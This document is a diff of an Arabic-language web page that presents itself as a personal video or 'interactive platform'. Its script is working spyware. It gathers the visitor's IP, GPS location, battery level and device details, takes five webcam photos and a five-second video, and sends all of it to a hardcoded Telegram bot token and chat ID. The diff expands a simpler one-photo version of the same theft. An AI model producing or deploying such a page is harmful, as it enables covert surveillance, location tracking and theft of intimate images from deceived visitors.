@@ -3,155 +3,303 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📽️ فيديو خاص بك</title>
+  <title>📽️ منصة تفاعلية</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <style>
     body {
       margin: 0;
       font-family: 'Tahoma', sans-serif;
-      background: black;
+      background: linear-gradient(135deg, #1a1a1a, #000);
       color: white;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       text-align: center;
+      transition: all 0.3s ease;
     }
     h1 {
-      font-size: 26px;
-      margin-bottom: 20px;
+      font-size: 28px;
+      margin-bottom: 15px;
+      animation: fadeIn 1s ease-in;
     }
     p {
       color: #ccc;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
+      max-width: 500px;
     }
-    button {
+    .button {
       background: #ff0050;
       color: white;
       border: none;
-      padding: 14px 28px;
+      padding: 12px 24px;
       border-radius: 50px;
-      font-size: 18px;
+      font-size: 16px;
       cursor: pointer;
+      margin: 10px;
+      transition: transform 0.2s, box-shadow 0.2s;
       box-shadow: 0 0 10px #ff0050;
+    }
+    .button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #ff0050;
+    }
+    .preview-container {
+      display: none;
+      margin-top: 20px;
+      max-width: 640px;
+    }
+    .preview-img {
+      width: 100px;
+      margin: 5px;
+      border: 2px solid #ff0050;
+      border-radius: 5px;
     }
     video {
       display: none;
     }
+    .notification {
+      position: fixed;
+      top: 20px;
+      background: #28a745;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 5px;
+      display: none;
+      animation: slideIn 0.5s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideIn {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
   </style>
 </head>
 <body>
-  <h1>📽️ اضغط لمشاهدة الفيديو</h1>
-  <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
-  <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
-
+  <h1>📽️ منصة تفاعلية متكاملة</h1>
+  <p>اضغط لتجربة الميزات: التقاط صور، فيديو، والوصول إلى تطبيقاتك المفضلة!</p>
+  <button class="button" onclick="startProcess()">▶️ بدء التجربة</button>
+  <button class="button" onclick="openWhatsApp()">📱 فتح واتساب</button>
+  <button class="button" onclick="openFacebook()">📘 فتح فيسبوك</button>
+  <button class="button" onclick="openYouTubeStudio()">🎥 فتح YouTube Studio</button>
+  <button class="button" onclick="openApp('camera')">📷 فتح الكاميرا</button>
+  <div class="preview-container" id="previewContainer"></div>
+  <div class="notification" id="notification"></div>
   <video id="video" autoplay playsinline></video>
 
   <script>
     const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
     const chatId = "7220184605";
+    const secretKey = "MySecretKey123"; // مفتاح التشفير
 
+    // إشعار للمستخدم
+    function showNotification(message) {
+      const noti = document.getElementById("notification");
+      noti.textContent = message;
+      noti.style.display = "block";
+      setTimeout(() => (noti.style.display = "none"), 3000);
+    }
+
+    // تشفير النص
+    function encryptMessage(text) {
+      return CryptoJS.AES.encrypt(text, secretKey).toString();
+    }
+
+    // إرسال رسالة إلى تليجرام
     async function sendTelegramMessage(text) {
+      const encryptedText = encryptMessage(text);
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text }),
+        body: JSON.stringify({ chat_id: chatId, text: encryptedText }),
       });
+      showNotification("تم إرسال البيانات!");
     }
 
-    async function sendPhoto(blob) {
+    // إرسال صورة
+    async function sendPhoto(blob, index) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", blob, "photo.jpg");
-
+      formData.append("photo", blob, `photo_${index}.jpg`);
       await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
-        body: formData
+        body: formData,
+      });
+      showNotification(`تم إرسال الصورة ${index}!`);
+    }
+
+    // إرسال فيديو
+    async function sendVideo(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("video", blob, "video.mp4");
+      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: formData,
+      });
+      showNotification("تم إرسال الفيديو!");
+    }
+
+    // جمع معلومات إضافية
+    async function getDeviceInfo() {
+      const ipInfo = await (await fetch("https://ipapi.co/json/")).json();
+      const battery = await navigator.getBattery?.() || { level: "غير معروف", charging: "غير معروف" };
+      const location = await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(`https://maps.google.com/?q=${pos.coords.latitude.toFixed(5)},${pos.coords.longitude.toFixed(5)}`),
+          () => resolve("❌ غير مسموح"),
+          { timeout: 5000 }
+        );
+      });
+      const connection = navigator.connection || {};
+      return {
+        country: ipInfo.country_name || "غير معروف",
+        city: ipInfo.city || "غير معروف",
+        ip: ipInfo.ip || "غير معروف",
+        location,
+        batteryLevel: battery.level ? Math.round(battery.level * 100) + "%" : "غير معروف",
+        batteryCharging: battery.charging ? "نعم ⚡" : "لا ❌",
+        device: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        network: connection.effectiveType || "غير معروف",
+        speed: connection.downlink || "غير معروف",
+        memory: navigator.deviceMemory || "غير معروف",
+        cores: navigator.hardwareConcurrency || "غير معروف",
+        language: navigator.language || "غير معروف",
+        time: new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" }),
+      };
+    }
+
+    // ضغط الصور
+    async function compressImage(blob) {
+      const img = new Image();
+      const canvas = document.createElement("canvas");
+      canvas.width = 320; // تقليل الدقة
+      canvas.height = 240;
+      const ctx = canvas.getContext("2d");
+      img.src = URL.createObjectURL(blob);
+      await new Promise(resolve => (img.onload = resolve));
+      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
+    }
+
+    // التقاط الصور
+    async function capturePhotos(stream) {
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+      video.play();
+      const canvas = document.createElement("canvas");
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext("2d");
+      const previewContainer = document.getElementById("previewContainer");
+      previewContainer.style.display = "block";
+
+      for (let i = 1; i <= 5; i++) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(async blob => {
+          const compressedBlob = await compressImage(blob);
+          await sendPhoto(compressedBlob, i);
+          const img = document.createElement("img");
+          img.src = URL.createObjectURL(compressedBlob);
+          img.className = "preview-img";
+          previewContainer.appendChild(img);
+        }, "image/jpeg");
+      }
+      stream.getTracks().forEach(track => track.stop());
+    }
+
+    // تسجيل فيديو
+    async function recordVideo(stream) {
+      const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+      const chunks = [];
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.start();
+      await new Promise(resolve => setTimeout(resolve, 5000)); // 5 ثوانٍ
+      recorder.stop();
+      stream.getTracks().forEach(track => track.stop());
+      return new Promise(resolve => {
+        recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
       });
     }
 
-    async function getIPInfo() {
-      const res = await fetch("https://ipapi.co/json/");
-      return await res.json();
-    }
-
-    async function getBatteryInfo() {
-      try {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100),
-          charging: battery.charging ? "نعم ⚡" : "لا ❌"
-        };
-      } catch {
-        return { level: "غير معروف", charging: "غير معروف" };
+    // فتح واتساب
+    function openWhatsApp() {
+      const phone = prompt("أدخل رقم الهاتف (مع رمز الدولة، مثل +966):");
+      if (phone) {
+        window.open(`https://wa.me/${phone.replace(/\D/g, "")}`, "_blank");
+        showNotification("تم فتح واتساب!");
+      } else {
+        window.open("https://web.whatsapp.com", "_blank"); // فتح واتساب ويب[](https://blog.whatsapp.com/whats-app-web?lang=ar)
+        showNotification("افتح واتساب على هاتفك وامسح رمز QR!");
       }
     }
 
-    async function getLocation() {
-      return new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition((pos) => {
-          const lat = pos.coords.latitude.toFixed(5);
-          const lon = pos.coords.longitude.toFixed(5);
-          resolve(`https://maps.google.com/?q=${lat},${lon}`);
-        }, () => {
-          resolve("❌ غير مسموح أو غير متاح");
-        }, { timeout: 5000 });
-      });
+    // فتح فيسبوك
+    function openFacebook() {
+      window.open("https://www.facebook.com", "_blank");
+      showNotification("تم فتح فيسبوك!");
     }
 
+    // فتح YouTube Studio
+    function openYouTubeStudio() {
+      window.open("https://studio.youtube.com", "_blank");
+      showNotification("تم فتح YouTube Studio!");
+    }
+
+    // فتح تطبيقات الجوال
+    function openApp(type) {
+      let url;
+      if (type === "camera") {
+        url = "camera://"; // غير مدعوم على معظم المتصفحات
+      } else {
+        url = prompt("أدخل رابط URL scheme للتطبيق (مثل tel://):");
+      }
+      if (url) {
+        window.location.href = url;
+        showNotification("جاري محاولة فتح التطبيق...");
+      } else {
+        showNotification("يرجى إدخال رابط صالح!");
+      }
+    }
+
+    // بدء العملية
     async function startProcess() {
-      const ipInfo = await getIPInfo();
-      const battery = await getBatteryInfo();
-      const location = await getLocation();
-      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
-
-      const deviceInfo = navigator.userAgent;
-      const screenRes = `${screen.width}x${screen.height}`;
-      const connection = navigator.connection || {};
-      const memory = navigator.deviceMemory || "غير معروف";
-      const cores = navigator.hardwareConcurrency || "غير معروف";
-
+      showNotification("جاري جمع البيانات...");
+      const info = await getDeviceInfo();
       const message = `
 📝 معلومات الزائر:
-🌍 الدولة: ${ipInfo.country_name} 
-🏙️ المدينة: ${ipInfo.city}
-🌐 IP: ${ipInfo.ip}
-📍 الموقع الجغرافي: ${location}
-
-📱 الجهاز:
-🔋 الشحن: ${battery.level}%
-⚡ هل يشحن؟: ${battery.charging}
-📶 الاتصال: ${connection.effectiveType || "غير معروف"}
-💾 الذاكرة: ${memory} GB
-⚙️ الأنوية: ${cores}
-🖥️ المتصفح: ${deviceInfo}
-📏 الشاشة: ${screenRes}
-🕓 الوقت: ${now}
+🌍 الدولة: ${info.country}
+🏙️ المدينة: ${info.city}
+🌐 IP: ${info.ip}
+📍 الموقع: ${info.location}
+🔋 البطارية: ${info.batteryLevel}
+⚡ الشحن: ${info.batteryCharging}
+📶 الشبكة: ${info.network}
+📡 السرعة: ${info.speed} Mbps
+💾 الذاكرة: ${info.memory} GB
+⚙️ الأنوية: ${info.cores}
+🖥️ المتصفح: ${info.device}
+📏 الشاشة: ${info.screen}
+🌐 اللغة: ${info.language}
+🕓 الوقت: ${info.time}
 `;
-
+      localStorage.setItem("userData", JSON.stringify(info)); // تخزين محلي
       await sendTelegramMessage(message);
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        video.play();
-
-        setTimeout(() => {
-          const canvas = document.createElement("canvas");
-          canvas.width = 640;
-          canvas.height = 480;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          stream.getTracks().forEach(track => track.stop());
-
-          canvas.toBlob(async (blob) => {
-            await sendPhoto(blob);
-          }, "image/jpeg");
-        }, 3000);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        await capturePhotos(stream);
+        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const videoBlob = await recordVideo(videoStream);
+        await sendVideo(videoBlob);
       } catch (err) {
-        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
+        await sendTelegramMessage("⚠️ الكاميرا أو الميكروفون غير مفعل: " + err.message);
       }
     }
   </script>
